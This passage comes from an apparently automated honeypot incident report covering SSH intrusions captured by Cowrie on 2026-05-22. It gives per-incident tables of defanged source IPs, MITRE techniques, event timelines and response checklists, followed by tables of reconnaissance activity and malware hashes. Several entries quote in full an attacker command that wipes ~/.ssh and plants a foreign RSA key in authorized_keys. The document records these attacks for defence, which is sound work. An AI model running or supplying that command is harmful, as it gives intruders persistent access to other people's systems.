- [ ] Submit `197.243.14[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.243.14[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35e7dcd9625

| Field | Detail |
|---|---|
| **Source IP** | `197.243.14[.]52` |
| **First Seen** | 2026-05-22 08:26 |
| **Last Seen** | 2026-05-22 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:26:06` | `cowrie.session.connect` |
| `2026-05-22 08:26:06` | `cowrie.client.version` |
| `2026-05-22 08:26:06` | `cowrie.client.kex` |
| `2026-05-22 08:26:07` | `cowrie.login.success` |
| `2026-05-22 08:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.14[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.243.14[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b15c324865b

| Field | Detail |
|---|---|
| **Source IP** | `45.143.200[.]246` |
| **First Seen** | 2026-05-22 08:27 |
| **Last Seen** | 2026-05-22 08:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:27:34` | `cowrie.session.connect` |
| `2026-05-22 08:27:34` | `cowrie.client.version` |
| `2026-05-22 08:27:35` | `cowrie.client.kex` |
| `2026-05-22 08:27:35` | `cowrie.login.success` |
| `2026-05-22 08:27:35` | `cowrie.session.params` |
| `2026-05-22 08:27:35` | `cowrie.command.input` |
| `2026-05-22 08:27:35` | `cowrie.command.failed` |
| `2026-05-22 08:27:36` | `cowrie.log.closed` |
| `2026-05-22 08:27:36` | `cowrie.session.params` |
| `2026-05-22 08:27:36` | `cowrie.command.input` |
| `2026-05-22 08:27:36` | `cowrie.session.file_download` |
| `2026-05-22 08:27:36` | `cowrie.log.closed` |
| `2026-05-22 08:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.143.200[.]246` to AbuseIPDB if not already reported
- [ ] Block `45.143.200[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f931a695b024

| Field | Detail |
|---|---|
| **Source IP** | `45.143.200[.]246` |
| **First Seen** | 2026-05-22 08:27 |
| **Last Seen** | 2026-05-22 08:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:27:38` | `cowrie.session.connect` |
| `2026-05-22 08:27:38` | `cowrie.client.version` |
| `2026-05-22 08:27:38` | `cowrie.client.kex` |
| `2026-05-22 08:27:39` | `cowrie.login.success` |
| `2026-05-22 08:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.143.200[.]246` to AbuseIPDB if not already reported
- [ ] Block `45.143.200[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade67894e663

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-22 08:33 |
| **Last Seen** | 2026-05-22 08:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:33:56` | `cowrie.session.connect` |
| `2026-05-22 08:33:56` | `cowrie.client.version` |
| `2026-05-22 08:33:56` | `cowrie.client.kex` |
| `2026-05-22 08:33:57` | `cowrie.login.success` |
| `2026-05-22 08:33:57` | `cowrie.session.params` |
| `2026-05-22 08:33:57` | `cowrie.command.input` |
| `2026-05-22 08:33:57` | `cowrie.command.failed` |
| `2026-05-22 08:33:57` | `cowrie.log.closed` |
| `2026-05-22 08:33:57` | `cowrie.session.params` |
| `2026-05-22 08:33:57` | `cowrie.command.input` |
| `2026-05-22 08:33:58` | `cowrie.session.file_download` |
| `2026-05-22 08:33:58` | `cowrie.log.closed` |
| `2026-05-22 08:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1cef7403ac

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-22 08:34 |
| **Last Seen** | 2026-05-22 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:34:00` | `cowrie.session.connect` |
| `2026-05-22 08:34:00` | `cowrie.client.version` |
| `2026-05-22 08:34:00` | `cowrie.client.kex` |
| `2026-05-22 08:34:00` | `cowrie.login.success` |
| `2026-05-22 08:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371b40924601

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]161` |
| **First Seen** | 2026-05-22 08:55 |
| **Last Seen** | 2026-05-22 08:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:55:35` | `cowrie.session.connect` |
| `2026-05-22 08:55:36` | `cowrie.login.success` |
| `2026-05-22 08:55:36` | `cowrie.session.params` |
| `2026-05-22 08:55:38` | `cowrie.command.input` |
| `2026-05-22 08:55:38` | `cowrie.command.input` |
| `2026-05-22 08:55:39` | `cowrie.command.input` |
| `2026-05-22 08:55:40` | `cowrie.command.input` |
| `2026-05-22 08:55:40` | `cowrie.command.failed` |
| `2026-05-22 08:55:40` | `cowrie.log.closed` |
| `2026-05-22 08:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]161` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dca8979ef8dd

| Field | Detail |
|---|---|
| **Source IP** | `103.97.135[.]244` |
| **First Seen** | 2026-05-22 10:26 |
| **Last Seen** | 2026-05-22 10:27 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:26:33` | `cowrie.session.connect` |
| `2026-05-22 10:26:33` | `cowrie.client.version` |
| `2026-05-22 10:26:33` | `cowrie.client.kex` |
| `2026-05-22 10:26:33` | `cowrie.login.success` |
| `2026-05-22 10:26:34` | `cowrie.session.params` |
| `2026-05-22 10:26:34` | `cowrie.command.input` |
| `2026-05-22 10:26:34` | `cowrie.command.failed` |
| `2026-05-22 10:26:34` | `cowrie.log.closed` |
| `2026-05-22 10:26:34` | `cowrie.session.params` |
| `2026-05-22 10:26:34` | `cowrie.command.input` |
| `2026-05-22 10:26:34` | `cowrie.session.file_download` |
| `2026-05-22 10:26:34` | `cowrie.log.closed` |
| `2026-05-22 10:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.135[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.97.135[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfae57fa3e9b

| Field | Detail |
|---|---|
| **Source IP** | `103.97.135[.]244` |
| **First Seen** | 2026-05-22 10:26 |
| **Last Seen** | 2026-05-22 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:26:36` | `cowrie.session.connect` |
| `2026-05-22 10:26:36` | `cowrie.client.version` |
| `2026-05-22 10:26:36` | `cowrie.client.kex` |
| `2026-05-22 10:26:37` | `cowrie.login.success` |
| `2026-05-22 10:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.135[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.97.135[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30be4146f261

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:35 |
| **Last Seen** | 2026-05-22 10:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:35:45` | `cowrie.session.connect` |
| `2026-05-22 10:35:45` | `cowrie.client.version` |
| `2026-05-22 10:35:45` | `cowrie.client.kex` |
| `2026-05-22 10:35:45` | `cowrie.login.success` |
| `2026-05-22 10:35:46` | `cowrie.session.params` |
| `2026-05-22 10:35:46` | `cowrie.command.input` |
| `2026-05-22 10:35:46` | `cowrie.command.failed` |
| `2026-05-22 10:35:46` | `cowrie.log.closed` |
| `2026-05-22 10:35:46` | `cowrie.session.params` |
| `2026-05-22 10:35:46` | `cowrie.command.input` |
| `2026-05-22 10:35:46` | `cowrie.session.file_download` |
| `2026-05-22 10:35:46` | `cowrie.log.closed` |
| `2026-05-22 10:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67dd0acc92b2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:35 |
| **Last Seen** | 2026-05-22 10:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:35:48` | `cowrie.session.connect` |
| `2026-05-22 10:35:48` | `cowrie.client.version` |
| `2026-05-22 10:35:48` | `cowrie.client.kex` |
| `2026-05-22 10:35:48` | `cowrie.login.success` |
| `2026-05-22 10:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbfc6ea8e4c0

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:43 |
| **Last Seen** | 2026-05-22 10:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:43:51` | `cowrie.session.connect` |
| `2026-05-22 10:43:51` | `cowrie.client.version` |
| `2026-05-22 10:43:51` | `cowrie.client.kex` |
| `2026-05-22 10:43:51` | `cowrie.login.success` |
| `2026-05-22 10:43:52` | `cowrie.session.params` |
| `2026-05-22 10:43:52` | `cowrie.command.input` |
| `2026-05-22 10:43:52` | `cowrie.command.failed` |
| `2026-05-22 10:43:52` | `cowrie.log.closed` |
| `2026-05-22 10:43:52` | `cowrie.session.params` |
| `2026-05-22 10:43:52` | `cowrie.command.input` |
| `2026-05-22 10:43:52` | `cowrie.session.file_download` |
| `2026-05-22 10:43:52` | `cowrie.log.closed` |
| `2026-05-22 10:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8b700afbac

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:43 |
| **Last Seen** | 2026-05-22 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:43:54` | `cowrie.session.connect` |
| `2026-05-22 10:43:54` | `cowrie.client.version` |
| `2026-05-22 10:43:54` | `cowrie.client.kex` |
| `2026-05-22 10:43:55` | `cowrie.login.success` |
| `2026-05-22 10:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32882c886bb

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:47 |
| **Last Seen** | 2026-05-22 10:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:47:40` | `cowrie.session.connect` |
| `2026-05-22 10:47:40` | `cowrie.client.version` |
| `2026-05-22 10:47:40` | `cowrie.client.kex` |
| `2026-05-22 10:47:40` | `cowrie.login.success` |
| `2026-05-22 10:47:41` | `cowrie.session.params` |
| `2026-05-22 10:47:41` | `cowrie.command.input` |
| `2026-05-22 10:47:41` | `cowrie.command.failed` |
| `2026-05-22 10:47:41` | `cowrie.log.closed` |
| `2026-05-22 10:47:41` | `cowrie.session.params` |
| `2026-05-22 10:47:41` | `cowrie.command.input` |
| `2026-05-22 10:47:41` | `cowrie.session.file_download` |
| `2026-05-22 10:47:41` | `cowrie.log.closed` |
| `2026-05-22 10:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-777c76034dcb

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:47 |
| **Last Seen** | 2026-05-22 10:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:47:43` | `cowrie.session.connect` |
| `2026-05-22 10:47:43` | `cowrie.client.version` |
| `2026-05-22 10:47:43` | `cowrie.client.kex` |
| `2026-05-22 10:47:43` | `cowrie.login.success` |
| `2026-05-22 10:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.22.211[.]121` | **33** | 2026-05-22 09:02 | 2026-05-22 09:02 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `192.169.152[.]102` | **18** | 2026-05-22 08:47 | 2026-05-22 10:04 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `178.205.15[.]179` | **13** | 2026-05-22 08:17 | 2026-05-22 08:25 | 26m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.108[.]213` | **6** | 2026-05-22 10:29 | 2026-05-22 10:51 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `124.16.75[.]116` | **4** | 2026-05-22 08:13 | 2026-05-22 08:21 | 6m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.227.14[.]88` | **4** | 2026-05-22 09:47 | 2026-05-22 09:55 | 8m | 0 | `T1592` | 🟢 LOW |
| `118.233.9[.]15` | **3** | 2026-05-22 09:49 | 2026-05-22 09:50 | 3m | 0 | `T1592` | 🟢 LOW |
| `104.41.137[.]249` | **2** | 2026-05-22 10:13 | 2026-05-22 10:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.97.135[.]244` | 1 | 2026-05-22 10:26 | 2026-05-22 10:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-05-22 08:04 | 2026-05-22 08:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.199.113[.]36` | 1 | 2026-05-22 09:25 | 2026-05-22 09:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.63.196[.]175` | 1 | 2026-05-22 07:53 | 2026-05-22 07:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `154.12.28[.]97` | 1 | 2026-05-22 07:56 | 2026-05-22 07:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.139[.]161` | 1 | 2026-05-22 08:55 | 2026-05-22 08:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.241.179[.]235` | 1 | 2026-05-22 09:21 | 2026-05-22 09:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-05-22 10:50 | 2026-05-22 10:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.243.14[.]52` | 1 | 2026-05-22 08:26 | 2026-05-22 08:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.44.15[.]210` | 1 | 2026-05-22 08:33 | 2026-05-22 08:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.143.200[.]246` | 1 | 2026-05-22 08:27 | 2026-05-22 08:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]190` | 1 | 2026-05-22 10:33 | 2026-05-22 10:34 | 16s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
